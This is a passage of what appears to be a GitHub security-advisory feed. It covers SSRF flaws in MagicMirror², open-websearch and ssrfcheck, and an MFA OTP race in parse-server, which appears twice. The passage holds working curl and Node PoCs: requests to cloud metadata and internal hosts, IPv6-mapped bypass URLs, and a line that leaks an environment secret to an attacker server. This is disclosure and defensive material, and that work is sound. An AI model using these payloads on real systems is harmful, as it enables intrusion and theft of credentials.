+<p>The <code>/cors</code> endpoint in <code>js/server_functions.js</code> (function <code>cors()</code>, lines 37-78) acts as an open HTTP proxy with no authentication and no URL validation. Any user-supplied URL is fetched server-side via <code>fetch()</code> and the full response is returned to the caller.</p>
+<p>Additionally, the <code>replaceSecretPlaceholder()</code> function (lines 21-25) expands any <code>**VARIABLE_NAME**</code> pattern in the URL with the corresponding <code>process.env</code> value before the request is made, allowing an attacker to exfiltrate environment variables (e.g. API keys, tokens, database credentials).</p>
+<p><strong>Vulnerable code path:</strong></p>
+<pre><code>GET /cors?url=&lt;attacker-controlled-url&gt;
+  → replaceSecretPlaceholder(url)     // expands **ENV_VAR** → process.env.ENV_VAR
+  → fetch(url)                        // no validation, no blocklist
+  → response returned to attacker     // full body, status, headers
+</code></pre>
+<p><strong>Key issues:</strong></p>
+<ul>
+<li>No authentication required</li>
+<li>No URL validation or blocklist for private/reserved IP ranges</li>
+<li>No restriction on URL scheme or destination</li>
+<li>Environment variable expansion in URL before fetch</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong> a running MagicMirror² instance accessible on the network (default: <code>http://&lt;host&gt;:8080</code>).</p>
+<p><strong>1. Basic SSRF — access cloud metadata (AWS IMDSv1):</strong></p>
+<pre><code>curl "http://&lt;target&gt;:8080/cors?url=http://169.254.169.254/latest/meta-data/"
+</code></pre>
+<p>If the server runs on AWS EC2 without IMDSv2 enforcement, this returns instance metadata including IAM role credentials.</p>
+<p><strong>2. Internal network scanning:</strong></p>
+<pre><code>curl "http://&lt;target&gt;:8080/cors?url=http://192.168.1.1/"
+curl "http://&lt;target&gt;:8080/cors?url=http://127.0.0.1:3000/"
+</code></pre>
+<p>The attacker can probe internal services by observing response status codes and timing.</p>
+<p><strong>3. Environment variable exfiltration:</strong></p>
+<pre><code>curl "http://&lt;target&gt;:8080/cors?url=http://&lt;attacker-server&gt;/?leak=**SECRET_API_KEY**"
+</code></pre>
+<p>The server expands <code>**SECRET_API_KEY**</code> to the value of <code>process.env.SECRET_API_KEY</code> before making the request, sending the secret to the attacker-controlled server as a query parameter.</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Cloud deployments (AWS/GCP/Azure):</strong> full compromise of cloud instance credentials via metadata service (169.254.169.254), potentially leading to lateral movement within the cloud account</li>
+<li><strong>Internal network access:</strong> the server becomes a proxy to scan and interact with services on internal networks that are not directly reachable by the attacker</li>
+<li><strong>Secret exfiltration:</strong> environment variables containing API keys, database credentials, or other sensitive configuration are directly readable</li>
+<li><strong>Affected users:</strong> anyone running MagicMirror² exposed to an untrusted network (including LAN). The <code>/cors</code> endpoint requires no authentication, so any host that can reach the MagicMirror HTTP port can exploit this vulnerability</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-ph6f-2cvq-79hq">https://github.com/MagicMirrorOrg/MagicMirror/security/advisories/GHSA-ph6f-2cvq-79hq</a></li>
+<li><a href="https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.36.0">https://github.com/MagicMirrorOrg/MagicMirror/releases/tag/v2.36.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-ph6f-2cvq-79hq">https://github.com/advisories/GHSA-ph6f-2cvq-79hq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-ph6f-2cvq-79hq</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-05T20:53:59.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[open-websearch] open-websearch has SSRF in `fetchWebContent` MCP tool: bracketed IPv6 literals and non-resolving hostname check bypass `isPrivateOrLocalHostname`]]></title>
+        <id>https://github.com/advisories/GHSA-v228-72c7-fx8j</id>
+        <link href="https://github.com/advisories/GHSA-v228-72c7-fx8j"/>
+        <updated>2026-05-05T20:51:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>src/utils/urlSafety.ts</code> exposes <code>isPublicHttpUrl</code> / <code>assertPublicHttpUrl</code>, used to gate the MCP <code>fetchWebContent</code> tool against private-network targets. The check has two defects that together allow <strong>non-blind SSRF with the response body returned to the caller</strong>:</p>
+<ol>
+<li><strong>Bracketed IPv6 literals are never recognized.</strong> Node's WHATWG <code>URL.hostname</code> keeps the surrounding <code>[…]</code> for IPv6 literals. <code>isIP("[::1]")</code> returns 0 (not 6), so neither <code>isPrivateIpv4</code> nor <code>isPrivateIpv6</code> is ever called on an IPv6 literal input — including <code>[::1]</code> itself, and including every IPv4-mapped form such as <code>[::ffff:7f00:1]</code> (= 127.0.0.1 via the IPv4 stack).</li>
+<li><strong>No DNS resolution.</strong> <code>isPrivateOrLocalHostname</code> only inspects the literal <code>hostname</code> string. It never resolves the host to an IP. Any attacker-controlled hostname whose DNS record points at 127.0.0.1 (or any RFC1918 / link-local address) passes the check unchanged, and <code>axios</code> then performs its own resolution and connects to the private address.</li>
+</ol>
+<p>The <code>isPrivateIpv6</code> implementation also has the hex bypass (it would miss <code>::ffff:7f00:1</code> even if reached) but defect (1) makes every bracketed IPv6 literal slip past before that branch is even entered.</p>
+<p>The <code>fetchWebContent</code> tool returns the response body (<code>JSON.stringify(result)</code>) to the MCP caller, so the SSRF is non-blind.</p>
+<h3 id="details">Details</h3>
+<p><strong>Vulnerable function</strong> — <code>src/utils/urlSafety.ts:95-119</code>:</p>
+<pre><code class="language-ts">export function isPrivateOrLocalHostname(hostname: string): boolean {
+  const host = hostname.trim().toLowerCase();
+  if (!host) return true;
+  if (host === 'localhost' || host.endsWith('.localhost')) return true;
+  if (host === 'metadata.google.internal' || host === 'metadata.azure.internal') return true;
+  const integerIp = parseIntegerIpv4Literal(host);
+  if (integerIp &amp;&amp; isPrivateIpv4(integerIp)) return true;
+  if (isPrivateOrLocalIp(host)) return true;   // only runs if isIP(host) ∈ {4, 6}
+  return false;
+}
+</code></pre>
+<p><code>isPrivateOrLocalIp</code> — <code>src/utils/urlSafety.ts:84-93</code>:</p>
+<pre><code class="language-ts">function isPrivateOrLocalIp(ip: string): boolean {
+  const version = isIP(ip);  // returns 0 for "[::1]", "[::ffff:7f00:1]", any bracketed literal
+  if (version === 4) return isPrivateIpv4(ip);
+  if (version === 6) return isPrivateIpv6(ip);
+  return false;
+}
+</code></pre>
+<p>Caller — <code>src/tools/setupTools.ts:252-286</code> (<code>fetchWebContent</code> tool):</p>
+<pre><code class="language-ts">server.tool(
+  fetchWebToolName,  // default: "fetchWebContent"
+  "Fetch content from a public HTTP(S) URL ...",
+  { url: z.string().url().refine(
+      (url) =&gt; validatePublicWebUrl(url),   // → isPublicHttpUrl → isPrivateOrLocalHostname
+      "URL must be a public HTTP(S) address ..."
+    ), /* … */ },
+  async ({url, maxChars}) =&gt; {
+    const result = await runtime.services.fetchWeb.execute({ url, maxChars, /*…*/ });
+    return { content: [{ type: 'text', text: JSON.stringify(result, null, 2) }] };
+  }
+);
+</code></pre>
+<p>Service — <code>src/engines/web/fetchWebContent.ts:313-375</code>: re-validates via <code>assertPublicHttpUrl</code> (same broken check), then calls <code>axios.head</code> + <code>axios.get</code> on the raw URL and returns <code>response.data</code> and <code>response.headers</code> to the caller.</p>
+<p>Transport — <code>src/index.ts:85-253</code>: when <code>config.enableHttpServer</code> is true (documented configuration; enabled by the Docker image), the MCP server binds on <code>0.0.0.0:${PORT}</code> (default <code>3000</code>) with CORS <code>origin: '*'</code> and <strong>no authentication</strong> on <code>/mcp</code> (Streamable HTTP) or <code>/sse</code> (legacy SSE). Anyone who can reach the port can invoke any tool.</p>
+<h3 data-heading="Verification of the validator (run against current `HEAD`)">Verification of the validator (run against current <code>HEAD</code>)</h3>
+<p>I executed the real <code>isPublicHttpUrl</code> / <code>assertPublicHttpUrl</code> from <code>src/utils/urlSafety.ts</code> under <code>tsx</code> against a set of inputs:</p>
+
+<table>
+<thead>
+<tr>
+<th>Input URL</th>
+<th>parsed.hostname</th>
+<th>isPublicHttpUrl</th>
+<th>assertPublicHttpUrl</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http://[::ffff:7f00:1]/ (127.0.0.1)</td>
+<td>[::ffff:7f00:1]</td>
+<td>true ← bypass</td>
+<td>PASSED ← bypass</td>
+</tr>
+<tr>
+<td>http://[::ffff:a9fe:1]/ (169.254.0.1)</td>
+<td>[::ffff:a9fe:1]</td>
+<td>true ← bypass</td>
+<td>PASSED ← bypass</td>
+</tr>
+<tr>
+<td>http://[::ffff:a00:1]/ (10.0.0.1)</td>
+<td>[::ffff:a00:1]</td>
+<td>true ← bypass</td>
+<td>PASSED ← bypass</td>
+</tr>
+<tr>
+<td>http://[::ffff:127.0.0.1]/</td>
+<td>[::ffff:7f00:1]</td>
+<td>true ← bypass</td>
+<td>PASSED ← bypass</td>
+</tr>
+<tr>
+<td>http://[0:0:0:0:0:0:0:1]/</td>
+<td>[::1]</td>
+<td>true ← bypass</td>
+<td>PASSED ← bypass</td>
+</tr>
+<tr>
+<td>http://[::1]/ (plain loopback!)</td>
+<td>[::1]</td>
+<td>true ← bypass</td>
+<td>PASSED ← bypass</td>
+</tr>
+<tr>
+<td><a href="http://127.0.0.1/">http://127.0.0.1/</a> (control)</td>
+<td>127.0.0.1</td>
+<td>false (blocked)</td>
+<td>threw (blocked)</td>
+</tr>
+<tr>
+<td><a href="http://localhost/">http://localhost/</a> (control)</td>
+<td>localhost</td>
+<td>false (blocked)</td>
+<td>threw (blocked)</td>
+</tr>
+</tbody></table>
+<p>WHATWG <code>new URL("http://[::ffff:127.0.0.1]/").hostname</code> returns <code>[::ffff:7f00:1]</code> — note that Node's URL parser actively re-encodes the dotted form to hex, helping the bypass. Every bracketed IPv6 literal passes the validator.</p>
+<h3 data-heading="Verification of the fetch (Node 22/25)">Verification of the fetch (Node 22/25)</h3>
+<p>I bound a trivial HTTP server to <code>127.0.0.1:29999</code> and called <code>axios.get("http://[::ffff:7f00:1]:29999/")</code> from Node; the request reached the server:</p>
+<pre><code>  HIT: / from 127.0.0.1 family IPv4
+http://[::ffff:7f00:1]:29999/ -&gt; 200 &lt;html&gt;internal content&lt;/html&gt;
+</code></pre>
+<p>The OS routes <code>::ffff:X.X.X.X</code> connections through the IPv4 stack, so the PoC works identically across macOS and Linux.</p>
+
+<p>Environment: clean clone of <code>Aas-ee/open-webSearch@HEAD</code>, Node 22+.</p>
+<p><strong>1. Start the MCP HTTP server.</strong></p>
+<pre><code class="language-bash">git clone https://github.com/Aas-ee/open-webSearch.git
+cd open-webSearch
+npm install &amp;&amp; npm run build
+MODE=http PORT=3000 node build/index.js &amp;
+</code></pre>
+<p><strong>2. Stand up a canary on loopback.</strong></p>
+<pre><code class="language-bash">node -e '
+  require("http").createServer((q,r)=&gt;{
+    console.log("[canary]", q.method, q.url, "from", q.socket.remoteAddress);
+    r.writeHead(200, {"content-type":"text/html"});
+    r.end("INTERNAL-SECRET: canary-hit for " + q.url);
+  }).listen(19999, "127.0.0.1", () =&gt; console.log("canary on 127.0.0.1:19999"));
+' &amp;
+</code></pre>
+<p><strong>3. Open an MCP session and call <code>fetchWebContent</code> with the bypass URL.</strong></p>
+<pre><code class="language-bash"># Accept header must include both JSON and SSE for Streamable HTTP transport.
+ACCEPT='application/json, text/event-stream'
+
+# initialize → grab the mcp-session-id header
+SID=$(curl -sSD - -o /dev/null -X POST http://127.0.0.1:3000/mcp \
+  -H "Accept: $ACCEPT" -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"poc","version":"0"}}}' \
+  | awk 'tolower($1)=="mcp-session-id:" { gsub(/\r/,""); print $2 }')
+
+# notifications/initialized
+curl -sS -X POST http://127.0.0.1:3000/mcp \
+  -H "Accept: $ACCEPT" -H 'Content-Type: application/json' -H "mcp-session-id: $SID" \
+  -d '{"jsonrpc":"2.0","method":"notifications/initialized","params":{}}' &gt;/dev/null
+
+# call fetchWebContent with the SSRF bypass URL
+curl -sS -X POST http://127.0.0.1:3000/mcp \
+  -H "Accept: $ACCEPT" -H 'Content-Type: application/json' -H "mcp-session-id: $SID" \
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{
+        "name":"fetchWebContent",
+        "arguments":{"url":"http://[::ffff:7f00:1]:19999/internal","maxChars":10000}
+      }}'
+</code></pre>
+<p>Expected result: the canary logs <code>[canary] GET /internal from 127.0.0.1</code>, and the MCP response contains <code>INTERNAL-SECRET: canary-hit for /internal</code> in the tool's <code>content[0].text</code>.</p>
+<p>Additional bypass vectors that work the same way:</p>
+<ul>
+<li><code>http://[::1]:&lt;port&gt;/</code> — plain IPv6 loopback.</li>
+<li><code>http://[::ffff:a9fe:1]/latest/meta-data/iam/security-credentials/</code> — AWS EC2 metadata over the IPv4 stack.</li>
+<li><code>http://attacker.example/</code> where <code>attacker.example</code> has A/AAAA pointing at any private address — bypasses via defect (2), no IPv6 trick needed.</li>
+</ul>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Cross-tenant SSRF with full response body.</strong> Any client that can speak MCP to the HTTP transport can fetch arbitrary private-network URLs and receive the response body. AWS EC2 metadata, internal dashboards, loopback services, RFC1918 neighbours — all in scope.</li>
+<li><strong>Pre-auth when <code>enableHttpServer</code> is set.</strong> No authentication layer exists on <code>/mcp</code> or <code>/sse</code>; CORS is <code>*</code>.</li>
+<li><strong>DNS-rebinding / LAN-victim angle.</strong> Because <code>/mcp</code> is CORS <code>*</code> and accepts <code>POST</code>, a victim who visits an attacker-controlled webpage while running open-webSearch locally will have their browser used to send tool-call requests, and the tool's response can be exfiltrated back via a simple XHR.</li>
+<li><strong>Exploitable over stdio too.</strong> Even with HTTP disabled, a compromised or prompt-injected MCP client can call <code>fetchWebContent</code> against loopback on the host running the server — a realistic LLM-agent-abuse vector.</li>
+</ul>
+<p>No meaningful mitigation in the call chain: only <code>http://</code> and <code>https://</code> schemes are accepted, but that is not a restriction for SSRF.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Two changes, either of which individually closes most of the gap; both together close it fully.</p>
+<ol>
+<li><p><strong>Normalize the hostname before IP checks, and perform a DNS resolution.</strong> Use the <code>ip-address</code> package or a similar canonicalizer, and reject any <code>getaddrinfo</code> result whose IP falls in a private CIDR. Keep a bracket-stripping step for IPv6 literals before calling <code>isIP()</code>.</p>
+<pre><code class="language-ts">import { lookup } from 'node:dns/promises';
+import { Address4, Address6 } from 'ip-address';
+
+function stripBrackets(h: string): string {
+  return h.startsWith('[') &amp;&amp; h.endsWith(']') ? h.slice(1, -1) : h;
+}
+
+const BLOCKED_V6_CIDRS = [
+  '::1/128', '::/128',
+  'fc00::/7', 'fe80::/10',
+  '2001:db8::/32', '2002::/16', '64:ff9b::/96',
+  '100::/64', 'ff00::/8',
+  '::ffff:0:0/96',   // IPv4-mapped — delegate to v4 check
+];
+
+function ipv6IsPrivate(addr6: Address6): boolean {
+  const v4 = addr6.to4();
+  if (v4 &amp;&amp; v4.isValid()) return isPrivateIpv4(v4.address);
+  return BLOCKED_V6_CIDRS.some(cidr =&gt; addr6.isInSubnet(new Address6(cidr)));
+}
+
+export async function assertPublicHttpUrl(url: URL | string, label = 'URL') {
+  const parsed = typeof url === 'string' ? new URL(url) : url;
+  if (parsed.protocol !== 'http:' &amp;&amp; parsed.protocol !== 'https:') throw …;
+  const host = stripBrackets(parsed.hostname);
+
+  // Literal IP case.
+  const v = isIP(host);
+  if (v === 4 &amp;&amp; isPrivateIpv4(host)) throw …;
+  if (v === 6 &amp;&amp; ipv6IsPrivate(new Address6(host))) throw …;
+
+  if (v === 0) {
+    // Hostname — resolve and check every record.
+    const records = await lookup(host, { all: true, verbatim: true });
+    for (const r of records) {
+      if (r.family === 4 &amp;&amp; isPrivateIpv4(r.address)) throw …;
+      if (r.family === 6 &amp;&amp; ipv6IsPrivate(new Address6(r.address))) throw …;
+    }
+  }
+}
+</code></pre>
+</li>
+<li><p><strong>Dual-pin the connection.</strong> Even a perfect pre-connect check has TOCTOU gaps (DNS rebinding between check and <code>axios.get</code>). Use a custom <code>undici</code> <code>Agent</code> whose <code>connect</code> hook validates the actual connected socket IP via <code>socket.remoteAddress</code>. That closes the rebinding window.</p>
+</li>
+<li><p><strong>Gate the HTTP transport.</strong> Require a bearer token (env var) on <code>/mcp</code> and <code>/sse</code>, and restrict binding to <code>127.0.0.1</code> by default. CORS <code>*</code> plus no-auth on <code>0.0.0.0</code> is the same exposure profile as an unauthenticated open proxy.</p>
+</li>
+</ol>
+<p>Test vectors to add to the suite:</p>
+<pre><code class="language-ts">for (const url of [
+  'http://[::1]/', 'http://[::]/',
+  'http://[::ffff:127.0.0.1]/', 'http://[::ffff:7f00:1]/',
+  'http://[0:0:0:0:0:ffff:127.0.0.1]/',
+  'http://[0:0:0:0:0:0:0:1]/', 'http://[::0:1]/', 'http://[0:0::1]/',
+  'http://[::ffff:a00:1]/', 'http://[::ffff:c0a8:1]/', 'http://[::ffff:a9fe:1]/',
+]) expect(isPublicHttpUrl(url)).toBe(false);
+### References
+
+- &lt;https://github.com/Aas-ee/open-webSearch/security/advisories/GHSA-v228-72c7-fx8j&gt;
+- &lt;https://github.com/advisories/GHSA-v228-72c7-fx8j&gt;
+</code></pre>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v228-72c7-fx8j</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-05T20:51:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[parse-server] parse-server: MFA SMS one-time password accepted twice under concurrent login]]></title>
+        <id>https://github.com/advisories/GHSA-jpq4-7fmq-q5fj</id>
+        <link href="https://github.com/advisories/GHSA-jpq4-7fmq-q5fj"/>
+        <updated>2026-05-05T20:30:45.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>A race condition in the MFA SMS one-time password (OTP) login path allows two concurrent <code>/login</code> requests carrying the same OTP to both succeed and both receive valid session tokens, breaking the single-use property of the OTP. The vulnerability requires the attacker to already possess the victim's password and intercept the active SMS OTP (e.g. via SIM swap, network mirror, or phishing relay) and to race the legitimate login request, so the practical attack surface is narrow.</p>
+<p>This advisory is the same class of incomplete fix as <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-2299-ghjr-6vjp">GHSA-2299-ghjr-6vjp</a> (TOTP recovery codes) and <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-w73w-g5xw-rwhf">GHSA-w73w-g5xw-rwhf</a> (MFA recovery in authData-only login). Those previous fixes added optimistic locking only for array-typed authData fields; SMS MFA stores the OTP as a string, so the guard skipped it.</p>
+<h3 id="patches">Patches</h3>
+<p>The optimistic lock has been generalized to cover primitive (string, number, boolean) and array authData fields. The lock is implemented as a shared helper <code>applyAuthDataOptimisticLock</code> that adds equality predicates on the original values of changed fields to the update WHERE clause. Concurrent writers racing the same single-use token now miss the WHERE condition and surface as <code>Invalid auth data</code>.</p>
+<h3 id="workarounds">Workarounds</h3>
+<ul>
+<li>Disable SMS MFA and use TOTP instead (TOTP tokens are time-window validated, not stored single-use).</li>
+<li>Place a rate limiter on the <code>/login</code> endpoint to reduce concurrent-request burst capacity.</li>
+</ul>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-jpq4-7fmq-q5fj">https://github.com/parse-community/parse-server/security/advisories/GHSA-jpq4-7fmq-q5fj</a></li>
+<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/pull/10448">https://github.com/parse-community/parse-server/pull/10448</a></li>
+<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/pull/10449">https://github.com/parse-community/parse-server/pull/10449</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-jpq4-7fmq-q5fj">https://github.com/parse-community/parse-server/security/advisories/GHSA-jpq4-7fmq-q5fj</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10448">https://github.com/parse-community/parse-server/pull/10448</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10449">https://github.com/parse-community/parse-server/pull/10449</a></li>
+<li><a href="https://github.com/advisories/GHSA-jpq4-7fmq-q5fj">https://github.com/advisories/GHSA-jpq4-7fmq-q5fj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jpq4-7fmq-q5fj</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-05-05T20:30:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[parse-server] parse-server: MFA SMS one-time password accepted twice under concurrent login]]></title>
+        <id>https://github.com/advisories/GHSA-jpq4-7fmq-q5fj</id>
+        <link href="https://github.com/advisories/GHSA-jpq4-7fmq-q5fj"/>
+        <updated>2026-05-05T20:30:45.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>A race condition in the MFA SMS one-time password (OTP) login path allows two concurrent <code>/login</code> requests carrying the same OTP to both succeed and both receive valid session tokens, breaking the single-use property of the OTP. The vulnerability requires the attacker to already possess the victim's password and intercept the active SMS OTP (e.g. via SIM swap, network mirror, or phishing relay) and to race the legitimate login request, so the practical attack surface is narrow.</p>
+<p>This advisory is the same class of incomplete fix as <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-2299-ghjr-6vjp">GHSA-2299-ghjr-6vjp</a> (TOTP recovery codes) and <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-w73w-g5xw-rwhf">GHSA-w73w-g5xw-rwhf</a> (MFA recovery in authData-only login). Those previous fixes added optimistic locking only for array-typed authData fields; SMS MFA stores the OTP as a string, so the guard skipped it.</p>
+<h3 id="patches">Patches</h3>
+<p>The optimistic lock has been generalized to cover primitive (string, number, boolean) and array authData fields. The lock is implemented as a shared helper <code>applyAuthDataOptimisticLock</code> that adds equality predicates on the original values of changed fields to the update WHERE clause. Concurrent writers racing the same single-use token now miss the WHERE condition and surface as <code>Invalid auth data</code>.</p>
+<h3 id="workarounds">Workarounds</h3>
+<ul>
+<li>Disable SMS MFA and use TOTP instead (TOTP tokens are time-window validated, not stored single-use).</li>
+<li>Place a rate limiter on the <code>/login</code> endpoint to reduce concurrent-request burst capacity.</li>
+</ul>
+<h3 id="resources">Resources</h3>
+<ul>
+<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-jpq4-7fmq-q5fj">https://github.com/parse-community/parse-server/security/advisories/GHSA-jpq4-7fmq-q5fj</a></li>
+<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/pull/10448">https://github.com/parse-community/parse-server/pull/10448</a></li>
+<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/pull/10449">https://github.com/parse-community/parse-server/pull/10449</a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-jpq4-7fmq-q5fj">https://github.com/parse-community/parse-server/security/advisories/GHSA-jpq4-7fmq-q5fj</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10448">https://github.com/parse-community/parse-server/pull/10448</a></li>
+<li><a href="https://github.com/parse-community/parse-server/pull/10449">https://github.com/parse-community/parse-server/pull/10449</a></li>
+<li><a href="https://github.com/advisories/GHSA-jpq4-7fmq-q5fj">https://github.com/advisories/GHSA-jpq4-7fmq-q5fj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jpq4-7fmq-q5fj</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-05-05T20:30:44.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[ssrfcheck] ssrfcheck Vulnerable to Server-Side Request Forgery (SSRF) and Incomplete List of Disallowed Inputs]]></title>
+        <id>https://github.com/advisories/GHSA-j4rj-2jr5-m439</id>
+        <link href="https://github.com/advisories/GHSA-j4rj-2jr5-m439"/>
+        <updated>2026-05-05T20:29:34.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>ssrfcheck</code> v1.3.0 (latest) fails to block Server-Side Request Forgery attacks when the target private IP address is encoded as an IPv4-mapped IPv6 address (e.g. <code>http://[::ffff:127.0.0.1]/</code>). The WHATWG URL parser built into Node.js silently normalizes the IPv4 notation inside the brackets to compressed hex form (<code>[::ffff:7f00:1]</code>) before the library's private-IP regex ever runs. The regex was written to match dot-notation only and therefore never matches any real input — all seven IANA private IPv4 ranges, including the AWS/GCP/Azure metadata address <code>169.254.169.254</code>, are bypassed. Any application using <code>isSSRFSafeURL()</code> to guard HTTP requests made with user-supplied URLs is fully exposed to SSRF.</p>
+<hr>
+<h3 id="details">Details</h3>
+<p><strong>Vulnerable file:</strong> <code>src/is-private-ip.js</code></p>
+<p>The library detects IPv6 private addresses using the <code>privIp6()</code> function. The relevant portion:</p>
+<pre><code class="language-js">// src/is-private-ip.js  (lines ~40-60 of the published source)
+function privIp6 (ip) {
+  return /^::$/.test(ip) ||
+    /^::1$/.test(ip) ||
+    /^::f{4}:([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
+    /^::f{4}:0.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
+    /^64:ff9b::([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$/.test(ip) ||
+    // ... more patterns, all expect dot-notation ...
+}
+</code></pre>
+<p>The third line is the IPv4-mapped IPv6 check. It expects input in the form <code>::ffff:127.0.0.1</code> (dots). However, the IP is extracted from the URL using <code>url.hostname</code>, which goes through the WHATWG URL parser first.</p>
+<p><strong>How WHATWG URL normalizes the address</strong> (<code>src/parse-url.js</code>):</p>
+<pre><code class="language-js">const url = new URL(normalizeURLStr(input));   // WHATWG URL parser runs here
+const ipcheck = trimBrackets(url.hostname);    // e.g. '::ffff:7f00:1'  ← hex, no dots
+const ipVersion = isIP(ipcheck);               // returns 6
+</code></pre>
+<p>The WHATWG URL spec (§5.3 IPv6 serializer) converts all embedded IPv4 notation to two 16-bit hex groups during parsing:</p>
+<pre><code>127.0.0.1       → 0x7f000001 → [0x7f00, 0x0001] → serialized as 7f00:1
+169.254.169.254 → 0xa9fea9fe → [0xa9fe, 0xa9fe] → serialized as a9fe:a9fe
+192.168.1.1     → 0xc0a80101 → [0xc0a8, 0x0101] → serialized as c0a8:101
+</code></pre>
+<p>So by the time the regex <code>/^::f{4}:(\d+)\.(\d+)\.(\d+)\.(\d+)$/</code> runs, the string it receives is <code>::ffff:7f00:1</code> — no dots, no match. The regex has been dead code since Node.js adopted WHATWG URL (v10+).</p>
+<p><strong>Entry point</strong> (<code>src/index.js</code>):</p>
+<pre><code class="language-js">if (hostIsIp &amp;&amp; (options.noIP || isLoopbackAddr(ip) || isPrivateIP(ip, ipVersion))) {
+  return false;   // ← never reached for IPv4-mapped IPv6
+}
+return true;      // ← always reached → BYPASS
+</code></pre>
+<hr>
+<h3 id="poc">PoC</h3>
+<p><strong>Environment:</strong> Node.js &gt;= 10, ssrfcheck any version including v1.3.0 (latest). No configuration required — default options are vulnerable.</p>
+<p><strong>Setup:</strong></p>
+<pre><code class="language-bash">mkdir ssrfcheck-poc &amp;&amp; cd ssrfcheck-poc
+npm init -y
+npm install ssrfcheck
+</code></pre>
+<p><strong>Step 1 — confirm WHATWG URL normalization:</strong></p>
+<pre><code class="language-bash">node &lt;&lt; 'EOF'
+const addrs = [
+  ['127.0.0.1',       'loopback'],
+  ['169.254.169.254', 'AWS/GCP/Azure metadata'],
+  ['192.168.1.1',     'private LAN'],
+  ['10.0.0.1',        '10.x range'],
+];
+for (const [ip, label] of addrs) {
+  const h = new URL('http://[::ffff:' + ip + ']/').hostname;
+  console.log(label + ' -&gt; ' + h);
+}
+EOF
+</code></pre>
+<p>Expected output — confirms WHATWG drops dots:</p>
+<pre><code>loopback              -&gt; [::ffff:7f00:1]
+AWS/GCP/Azure metadata -&gt; [::ffff:a9fe:a9fe]
+private LAN           -&gt; [::ffff:c0a8:101]
+10.x range            -&gt; [::ffff:a00:1]
+</code></pre>
+<p><strong>Step 2 — trigger the bypass:</strong></p>
+<pre><code class="language-bash">node &lt;&lt; 'EOF'
+const { isSSRFSafeURL } = require('ssrfcheck');
+
+const bypasses = [
+  'http://[::ffff:127.0.0.1]/',
+  'http://[::ffff:169.254.169.254]/',
+  'http://[::ffff:192.168.1.1]/',
+  'http://[::ffff:10.0.0.1]/',
+  'http://[::ffff:172.16.0.1]/',
+  'http://[::ffff:7f00:1]/',
+  'http://[0:0:0:0:0:ffff:127.0.0.1]/',
+];
+
+for (const url of bypasses) {
+  const result = isSSRFSafeURL(url);
+  console.log(result === true ? '[BYPASS]' : '[caught]', url, '-&gt;', result);
+}
+
+console.log('---');
+const r1 = isSSRFSafeURL('http://127.0.0.1/');
+const r2 = isSSRFSafeURL('http://192.168.1.1/');
+const r3 = isSSRFSafeURL('http://[::1]/');
+console.log('127.0.0.1 caught?',   r1 === false);
+console.log('192.168.1.1 caught?', r2 === false);
+console.log('[::1] caught?',        r3 === false);
+EOF
+</code></pre>
